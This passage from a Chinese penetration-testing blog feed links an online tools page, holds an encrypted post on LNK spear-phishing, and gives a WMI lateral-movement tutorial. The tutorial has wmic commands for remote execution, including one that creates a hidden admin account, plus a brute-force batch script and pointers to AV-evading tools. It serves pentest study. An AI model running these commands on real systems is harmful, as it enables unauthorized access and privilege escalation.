    <content type="html"><![CDATA[<blockquote><p>“成就他人是一个伟大的行为，我将贯彻到底。”    ——hl0rey</p></blockquote><a id="more"></a><p>作为天天肾透，日日肾虚的我们，常常需要借助各种各样的在线网站来进行信息收集、加密解密、数据处理…</p><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2020.08.24/2.jpg"></p><p>随着浏览器收藏夹分类越来越多，找到网址然后打开得操作越来越觉得麻烦，便花了一些时间来整理了下做成了一个导航页，页面内容不定期会保持更新。</p><p>也不用担心某一类型重复得网站太多，不知道用哪个好，基本上贴上去得我自己全部都使用过，备注 ”推荐“ 的就是用起来感觉不错得。</p><p>个人认为通过在线网站各种功能，完成信息收集60%的工作是完全没问题的，希望可以对看文章的你有所帮助~</p><p>在线工具 - 肾透测试中心 -  <a href="https://gitbook.se7ensec.cn/">https://gitbook.se7ensec.cn/</a> </p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;“成就他人是一个伟大的行为，我将贯彻到底。”    ——hl0rey&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="HTML" scheme="https://www.se7ensec.cn/tags/HTML/"/>
    
  </entry>
  
  <entry>
    <title>鱼叉攻击|使用Lnk文件的另类钓鱼方式</title>
    <link href="https://www.se7ensec.cn/2020/08/22/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB-Lnk%E6%96%87%E4%BB%B6%E7%9A%84%E5%8F%A6%E7%B1%BB%E9%92%93%E9%B1%BC%E6%96%B9%E5%BC%8F/"/>
    <id>https://www.se7ensec.cn/2020/08/22/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB-Lnk%E6%96%87%E4%BB%B6%E7%9A%84%E5%8F%A6%E7%B1%BB%E9%92%93%E9%B1%BC%E6%96%B9%E5%BC%8F/</id>
    <published>2020-08-22T07:10:24.000Z</published>
    <updated>2021-01-23T14:13:50.667Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="b2380840d3793d67b6d9fc04edcfc8d634b1b333d73b8018b76fc3a2791f250b">60a13925d46354e3c1b9aa984b9eaf9066ac7a8ed9b3f8311475aa9b656c0c6cb67fd62584250b5f70e1534e6acd923ed400d8b00febcb6e2af442161de0bfabb7b7a22e8c3d9161dd7027da92ac92fe223b1deb3d800d6d4bec059945898427bf7de58ea0c39595e0ee422c22019309ca3ea54fe9fb113d930f6b0b150249fecb94cb26c74df089102e8c7a3bb8f2dab2c9b01f64c7c394f1e8e377ad2401f86cef116145507c114bb964bc800a340dac05a8b60241783abafcad6737b8f88a55fdd09f4083a05e06df1f0cf8b8c630a63bb7f75ca3df6756f81c889af656bb77856417d7eeea7d73e4fde9414b0353960e0c16fad44752fbe22830cab8aafd510c40b58c233a8ba23f59612192e9c6491721c9c62595662bfd4796dac9abebf7cb19435a7ef6b40fec6eee85c67faf8d3f271efe9a7ef0ce4ccc344a61163bdca2aaba2e895d527fa0978901170d648b1f450f50b25d603f002aeece4be97588a2932879c85e0325690e08bb63add5e1b20049493071cfe90bcf14d13f875c18fab445603380958fb2f376317ad69c6fd4cbc9d33afa7412e63946a495cdf7a417b1990d246e054d278d24c5153f51ff970731b65b4b689410f580570f9f8e3a9f73bec92c0b70bcd49f4433c1e06bd7e5e4edd0c58cf7841682a7ff5111fcbc0a56f67d879229a682b8b60f8bcec11372b169e616c482f079994f53c7b8788677fb1722aa5bb1c698250585031b0c5caa312f98fce68268e563e7de65ad9a79982a94c41fea9289c93766d44d281b428fc45ced665f4a4323d2f733c9072259f06d614074f5876bd73d0b1624420c60ef7686dc02553d1b2c5e18ace329318fceb78d3bc49cbcab3f19949a805e4640ad45f828340e02e697120ffd22c8f92701e654fd33f7a1a111947f18dc5469498fdde9302640c85d3584dbcfc505d5605b766ac57a4c3be045f7ff78194d3cfa69c3be4f48d61840c226451cf7aaa3d3ec02b11a63f8a996658968e399e0e98da2afedb7e0d98719fd4a55e415c99f14b95c172e4dd2fa6656bef00a60bba994f72b5dc5dbac6be7627a740a1f8e713adf9f7ae230fe7ef44b4c27b7ac2553847682d5f7ad5bdd913b1302fe5d15880e789624bfb096f457f01033878ff595c15eaf88c215dd0130023687ae4ae0eace0dfb0ab731a310624b1bd92953fa7f171ff0dd69b26ff31cbaddbaddd3a6f85e63d0c7480e2682da9ef12d87dfa5558358e86d542c62372bdd8b324549a7f432838112e9e1447f3226c6b40b6dd0df179bc480f9d27a95b7e38627d2746160883a4b8a04542491e52b1875a8e71de625d64ccf39cf7100950f1c71caad7a05ada2252bc0beedb270c445308395158317b5b40d71d68c9435a33b64a7b8adddb471a0db5ead48e605630f2d9e10a43b22b61e5ebba00803e8c6473f7cb920af85ffd8a0c1cb55128c2fe6b1d6d3a38eca07650cc00ceebfcd8001177d5b6385e2ffb272faea39b74045025eee12464a925e32d01a2f52cd9aba5c7e75f4b5b0df5a8e5509f2ef01aef1b4573b2526935ed1b75a0764f81bf3d5fc24732d085b93b0a4e4949ecbb86963e7a9d1fa3ba6065caa79f871fa8ce363cffbd92942cb5406fd60a5d6b27e0d5d8140fc153b0e04669ad14ebbf773ddddf23e15193d3090552c0331de91b1651c1a84d3b6c7b1be4aa4b8fe1a283550dccbbd2b8d29e19c02434a0f3fbe53754292635b4ba08f0615721f131dbbfd30850692c0d6680271a3a0e42fa21113dc21d76950b0e5d41182849449621821cd74ed34ca3889dae7ba682405f88fd5f931627e72d37a56ab7cfcdf53d4e00d5341604f1651ae147ee82be71eaa6a387a3f82920d57c1c9b2aa9cd89ab14ae23e6e7cc8bf68827ae4d1e52d51f1a610df11f39ee5a10029394163320310826b229b6f42dacbfa5c515c359681d79d3c7f060d6cfc65c3b2ffd315d9a77a200f476502b70901d88a293b0bb7d9151e8bc41d3afe32bb11865d0099cf62f6bde2faef2c566a6b944fa7bb19563237ef552bded9b25293b154d0cab21d761bd6c293718183bb4b7f73c349bb8aa1674b7ab5777ea7a7d79fab879052ecf2e481bbe2a2fade9de7acb162067538c2b843d926a78aa4c18150c8b1ebfe7d832426ad2e4ed2338c1e58a544bb3a53e4398bb2d0553e145700e2784781fbc0c527754d3ae4ea98620af6e11be7cd79af2937eb647bc2cf6870e29886772e020eb386c3d073351b503066ce0c364bed838e23f9e22ee99896c3ab9bbd7850dc4261709dbec9f6076f74b294d01e2a6b8f4e7e420d4689354459eef7fc9195b664ce687b8bcd7d106973f8e4cc3c937401dd4780a1c7592cd5da9a096eabe4fada8a61760bf7b7b7bc05f7829f07a075a092a3ddc6955ff239d45514ecbceea1d2f469f038d317b03c860225daba43f9d451db8b3920923aa4cf7cf18358dfc1a2317ef6b575234feb2984cb776e68a19b7eb14de2ca26d7ed2152fb1bd56c76825335b5f9606448c959eaf095d391598ef85768f48f475682812ec8ea9a45c64c43da2fddf0b90d2927983ce66472777b94d79da54a0eba87b6157ba7971274662e3e1f3e40d825a46c92653e0ed0e84d90917770b3318635447c0e53114e5c098cd03d4ebe4026946055ddc5db3437da376cf443b2017666f70fed1a8635e1442fe40df2f23d7c70c38d597436a5c98207aff9395cb0150c419cd73e87e38126943e5b370d7ff638d447e30a1084e31dfb1419650428207321bc4669d524e6f41cea124805ec0cbfa06d97a3bd4dc3c92199d765cea6afc88b7adef161bb3dc21e44a97ba1a2d8dcf229431e3082e5d1bdd4492261babaf30a2d3c62a9e390fd3899bc2a2b4bf5be27118b6fe048e4e5199984ea033945ab9dc7e9fc3d710b936b8b47c643b8b84804b531a0ca58871d57e6aebc84c1d7cbf39c440c0d68d258dd81bc011221ed741d2a362b05c1c4479f6c67c959d2388925bab99fb52713ffaef078d7fdc9a72c83ac299679c42d3d2a9d0a65a7fd746a19b2e1145e5662e6e90e35c9f90470b4866098d17a4a68cb93848f7dc56624a550e63c011c79b37f3a7e1172c59a1da9bbb2eda3d10e4043557cb5b159a78a6b2528f43ead9f78636982899146b59f7b4c42c9571dc25192d76dd5cee312937a18c560d0dbf0d53de90d08f533eca6a9b09d9e7ce8c75c666f7d7e4de9599d677bc8416b1e358ca6fc3813a7c0396cb4c7e1ba1fa0f50e58bd5fe56c5a39770355ac25718786c295205872cb1d2515727eef69b7e7444106dfb3cec58c62693720ba52b942079a8c9ce952904b4d9ea21345efe61866923b32e66f4192f30c68247c495cd3f383db0b6ec6f7b16f54eaa18174018e66ec1f3c5757d8df65f9074d3d099ffab1d764cb9c7b32002bbf2aba24e0a71024354dc4376a0cf4081e43387eaeb1ac312382f2cb01d1fa35368755db065fb72e2c739f65c512913661b09709bc90d19125a0bfc0af67517350babd0ee2efda3e4afdc833548885a1241f6a912dc402d519f25559a8ba011bc0a6290fd4e43d2c66e9181c49bef7022dae2f72b81a3f34bc5132624d48444940404af3aa3985262af54637aec2d8d29cb749cefb44f0a9f43a012caf75fc020fb9563ee3a36cbee6a0242d5c101a507ef336a59aec8bf7cbe0c3d7744ab36c4324bb8375555fa35274ff3083283d501ca2ae92d6a62d7a2474598d595e6fbe02fec66437f28ed038a0f99a4921fedc907e3fbe8bd60b54699b2d1c5504eec503c7bddd4233670ccf1b79d2e1bbe2d89f199e144e449fc32648537ad64dd26e7250daba3ef76e6e1fd078189ad1ddf695da380ab4d0a110e996a9e07182c960d1a1a58d47b3224f513bed8fbe5042200ad4566a3111f774795cbe11f66910b480c8e298e6f58db00ce240d08fbdaa3736b298d0c191783701fbfb4710eac46e3d5e387d1eea4b1d9e248aa1da93c5e1e7799776171ca851ab4a9c52ac9ec613fe6f5feec3e5a3b17240ba915ff4591d66719bbd202bfa0c4df6afb1a48fa3a837742b16416c511b4ad30aaa2fb86fc176b96da3723c56a70ffe01a8c6723afb14fd572a99e0d32208a50f030dd8cfcbe03e253794410e93228121724ec106e69e7fff49b750de8029939beb5dc41e54f5e739b69d63d4abff1337d58b81554a8438ec71a082b8c8e4208cc07500653b2d8f945e3602ea6d42ffd3bbdeae7f2a2aa67c69c99cf4f57fac05e5f3ec7c9ab436cd8367</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="鱼叉攻击" scheme="https://www.se7ensec.cn/tags/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透|基于WMI的横向移动</title>
    <link href="https://www.se7ensec.cn/2020/07/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E4%BA%8Ewmi%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    <id>https://www.se7ensec.cn/2020/07/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%BA%E4%BA%8Ewmi%E7%9A%84%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</id>
    <published>2020-07-12T07:12:24.000Z</published>
    <updated>2021-06-19T08:28:00.660Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>基于WMI的横向移动</p></blockquote><a id="more"></a><h2 id="WMI-介绍"><a href="#WMI-介绍" class="headerlink" title="WMI 介绍"></a>WMI 介绍</h2><p><code>WMI </code>的全称是 <code>Windows Management Instrumentation</code>，它出现在所有的 <code>Windows</code>操作系统中，并由一组强大的工具集合组成，用于管理本地或远程的<code>Windows</code>系统，攻击者使用<code>wmi</code>来进行攻击，但 <code>Windows </code>系统默认不会在日志中记录这些操作，可以做到无日志，攻击脚本无需写入到磁盘，增加了隐蔽性。推荐使用<code>wmic</code>进行远程执行命令。 </p><h2 id="WMI-利用条件"><a href="#WMI-利用条件" class="headerlink" title="WMI 利用条件"></a>WMI 利用条件</h2><p> 远程服务器启动<code>Windows Management Instrumentation</code>服务（默认开启）</p><p> <code>135</code> 端口未被过滤 [<strong>默认配置下目标主机防火墙开启将无法连接</strong>]</p><h2 id="连接失败常见错误号："><a href="#连接失败常见错误号：" class="headerlink" title="连接失败常见错误号："></a>连接失败常见错误号：</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.开启防火墙时，允许共享例外</span><br><span class="line">错误:</span><br><span class="line">代码 = <span class="number">0</span>x800706ba</span><br><span class="line">说明 = RPC 服务器不可用。</span><br><span class="line">设备 = Win32</span><br><span class="line"><span class="number">2</span>.组策略阻止administraotr远程访问时</span><br><span class="line">错误:</span><br><span class="line">代码 = <span class="number">0</span>x80070005</span><br><span class="line">说明 = 拒绝访问。</span><br><span class="line">设备 = Win32</span><br><span class="line"><span class="number">3</span>.IP安全策略阻止<span class="number">135</span>时</span><br><span class="line">错误:</span><br><span class="line">代码 = <span class="number">0</span>x800706ba</span><br><span class="line">说明 = RPC 服务器不可用。</span><br><span class="line">设备 = Win32</span><br><span class="line"><span class="number">4</span>.禁用winmgmt服务时</span><br><span class="line">错误:</span><br><span class="line">代码 = <span class="number">0</span>x80070422</span><br><span class="line">说明 = 无法启动服务，原因可能是已被禁用或与其相关联的设备没有启动。</span><br><span class="line">设备 = Win32</span><br><span class="line"><span class="number">5</span>.拒绝wbem目录权限，无法使用wmic的</span><br><span class="line">......</span><br></pre></td></tr></table></figure><h2 id="利用-wmic-进行横向移动"><a href="#利用-wmic-进行横向移动" class="headerlink" title="利用 wmic 进行横向移动"></a>利用 wmic 进行横向移动</h2><h3 id="常用系统自带命令"><a href="#常用系统自带命令" class="headerlink" title="常用系统自带命令"></a>常用系统自带命令</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.列出远程主机进程</span><br><span class="line">wmic /node:<span class="number">192.168</span>.<span class="number">1.1</span> /user:<span class="number">192.168</span>.<span class="number">1.1</span>\administrator /password:!<span class="selector-tag">@</span><span class="comment">#123QWE process list brief</span></span><br><span class="line"><span class="number">2</span>.在远程系统上执行bat脚本</span><br><span class="line">wmic /node:<span class="number">192.168</span>.<span class="number">1.1</span> /user:<span class="number">192.168</span>.<span class="number">1.1</span>\administrator /password:!<span class="selector-tag">@</span><span class="comment">#123QWE process call create c:\programdata\test.bat</span></span><br><span class="line"><span class="number">3</span>.在远程系统上执行单条命令</span><br><span class="line">wmic /node:<span class="number">192.168</span>.<span class="number">1.1</span> /user:<span class="number">192.168</span>.<span class="number">1.1</span>\administrator /password:!<span class="selector-tag">@</span><span class="comment">#123QWE process call create &quot;cmd.exe /c net user test1 !@#123QWE /add &amp;&amp; net localgroup administrators test1 /add</span></span><br><span class="line"></span><br><span class="line">引用自：https://www.cnblogs.com/<span class="number">0</span>xdd/p/<span class="number">11393392</span>.html</span><br></pre></td></tr></table></figure><h3 id="批量爆破"><a href="#批量爆破" class="headerlink" title="批量爆破"></a>批量爆破</h3><p>wmi的爆破经过实践，错误次数3次以上，360会拦截【无杀软时没有测试】，记录日志为远程rdp爆破，并暂时限制wmi的连接。</p><p>※以下为单密码爆破，有爆破多个密码爆破的需求的话，可以根据ipc横向移动那篇自行修改</p><p><strong>坑点：需注意特殊字符，如密码中有 <code>%</code> 需要用 <code>%</code> 来转义，例 ：<code>123#$%</code> 应转化为 <code>123#$%%</code></strong> </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">cls</span></span><br><span class="line"><span class="built_in">echo</span> Useage: %<span class="number">0</span> ip.txt</span><br><span class="line"><span class="keyword">for</span> /f %%i <span class="keyword">in</span> (%<span class="number">1</span>) <span class="keyword">do</span> (</span><br><span class="line"><span class="built_in">echo</span> wmic /node:%%i /user:<span class="string">&quot;%%i\administrator&quot;</span> /password:<span class="string">&quot;123456&quot;</span> <span class="keyword">process</span> list brief  &gt;&gt; log.txt</span><br><span class="line">wmic /node:%%i /user:<span class="string">&quot;%%i\administrator&quot;</span> /password:<span class="string">&quot;123456&quot;</span> <span class="keyword">process</span> list brief &gt;NUL <span class="number">2</span>&gt;NUL</span><br><span class="line"><span class="keyword">IF</span> errorlevel == <span class="number">0</span> (</span><br><span class="line"><span class="built_in">echo</span> success:%%i &gt;&gt; pic.txt</span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line"><span class="built_in">echo</span> <span class="keyword">end</span> &gt;&gt; end.txt</span><br></pre></td></tr></table></figure><h3 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h3><h4 id="wmiexec-vbs"><a href="#wmiexec-vbs" class="headerlink" title="wmiexec.vbs"></a>wmiexec.vbs</h4><p>没有使用过，暂未测试</p><p><code>wmiexec.vbs</code> 是为了解决<code>wmic</code>无法回显命令而开发的一个工具，原理就是把数据先存到一个临时文件中，在每次读取完执行结果后就自动删除。可以用来回显 ”执行命令的结果“ 和获取 ”半交互式的 shell“  。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript wmiexec.vbs &#x2F;cmd 192.168.1.1 administrator test@123 whoami</span><br></pre></td></tr></table></figure><h4 id="impacket-wmiexec"><a href="#impacket-wmiexec" class="headerlink" title="impacket-wmiexec"></a>impacket-wmiexec</h4><p>优点：支持pth</p><p>缺点：他的使用需要调用wmi服务，占用目标的445、135和另一个随机端口。</p><p>使用参考：<a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Pass-The-Hash%E7%9A%84%E5%AE%9E%E7%8E%B0">域渗透——Pass The Hash的实现 (3gstudent.github.io)</a></p><h4 id="sharpwmi"><a href="#sharpwmi" class="headerlink" title="sharpwmi"></a>sharpwmi</h4><p>这是一个基于<code>135</code>端口来进行横向移动的工具，具有执行命令和上传文件功能，通过<code>wmi</code>来执行命令，通过调用来进行数据传输。<br>优点：只依赖<code>135</code>端口，不依赖<code>139</code>和<code>445</code>端口<br>缺点：目前只支持上传512kb以下的文件，因为重置每个值的长度不能超过512kb。执行命令和上传文件都依赖<strong>powershell(被360拦截了)</strong></p><p><a href="https://github.com/QAX-A-Team/sharpwmi">https://github.com/QAX-A-Team/sharpwmi</a></p><h4 id="sharpwmi（修改版）"><a href="#sharpwmi（修改版）" class="headerlink" title="sharpwmi（修改版）"></a>sharpwmi（修改版）</h4><p><a href="https://github.com/idiotc4t/sharpwmi">https://github.com/idiotc4t/sharpwmi</a></p><p>这是一个基于135端口来进行横向移动的工具，具有执行命令和上传文件功能,通过wmi来执行命令，通过注册表来进行数据传输。</p><h4 id="WMIHACKER-推荐"><a href="#WMIHACKER-推荐" class="headerlink" title="WMIHACKER(推荐)"></a>WMIHACKER(推荐)</h4><p>免杀横向渗透远程命令执行，常见的<code>WMIEXEC</code>、<code>PSEXEC</code>执行命令是创建服务或调用<code>Win32_Process.create</code>执行命令，这些方式都已经被杀软100%拦截，通过改造出<code>WMIHACKER</code>免杀横向移动测试工具。(只依赖<code>135</code>端口，不依赖<code>139</code>和<code>445</code>端口)</p><p>重要：支持pth -&gt;  <a href="https://github.com/360-Linton-Lab/WMIHACKER/issues/1">https://github.com/360-Linton-Lab/WMIHACKER/issues/1</a> </p><p>主要功能：1、命令执行；2、文件上传；3、文件下载</p><p><a href="https://github.com/360-Linton-Lab/WMIHACKER">https://github.com/360-Linton-Lab/WMIHACKER</a></p><h4 id="Ladon"><a href="#Ladon" class="headerlink" title="Ladon"></a>Ladon</h4><table><thead><tr><th align="left">模块功能</th><th align="left">目标端口</th><th align="left">目标系统</th><th align="left">使用教程</th></tr></thead><tbody><tr><td align="left">WMI爆破</td><td align="left">135端口</td><td align="left">Windows</td><td align="left"><a href="http://k8gege.org/Ladon/WmiScan.html">http://k8gege.org/Ladon/WmiScan.html</a></td></tr><tr><td align="left">WMI-NtlmHash爆破</td><td align="left">135端口</td><td align="left">Windows</td><td align="left"><a href="http://k8gege.org/Ladon/WmiHashScan.html">http://k8gege.org/Ladon/WmiHashScan.html</a></td></tr><tr><td align="left">WmiExec（推荐）</td><td align="left">135端口</td><td align="left">Windows</td><td align="left">只需135端口通过注册表回显，不像Impacket或其它工具还依赖445，不依赖PowerShell，适用于任意目标</td></tr><tr><td align="left">WmiExec2</td><td align="left">135端口</td><td align="left">Windows</td><td align="left">和WmiExec一样只需135端口通过注册表回显，但依赖PowerShell，无PowerShell的目标可能不适用</td></tr></tbody></table><h4 id="Sharp-WMIExec"><a href="#Sharp-WMIExec" class="headerlink" title="Sharp-WMIExec"></a>Sharp-WMIExec</h4><p>没有使用过，暂未测试</p><p><a href="https://github.com/checkymander/Sharp-WMIExec">https://github.com/checkymander/Sharp-WMIExec</a> </p><h4 id="WMIcmd"><a href="#WMIcmd" class="headerlink" title="WMIcmd"></a>WMIcmd</h4><p>没有使用过，暂未测试</p><p><a href="https://github.com/nccgroup/WMIcmd">https://github.com/nccgroup/WMIcmd</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;基于WMI的横向移动&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="内网渗透" scheme="https://www.se7ensec.cn/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
</feed>
